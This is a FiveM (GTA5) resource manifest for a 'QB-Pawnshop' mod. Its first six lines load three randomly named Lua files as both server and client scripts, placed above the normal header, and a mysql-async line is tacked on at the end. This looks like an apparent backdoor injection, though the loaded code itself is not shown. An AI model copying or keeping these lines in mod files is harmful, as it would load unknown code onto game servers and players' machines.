server_script "SY6.lua"
client_script "SY6.lua"
server_script "MT1.lua"
client_script "MT1.lua"
server_script "XSC09IHB6CQ4OB8.lua"
client_script "XSC09IHB6CQ4OB8.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-Pawnshop'
version '1.0.0'

server_scripts {
	'config.lua',
	'server/main.lua',
}

client_scripts {
	'config.lua',
	'client/main.lua',
	'client/melt.lua',
}server_scripts { '@mysql-async/lib/MySQL.lua' }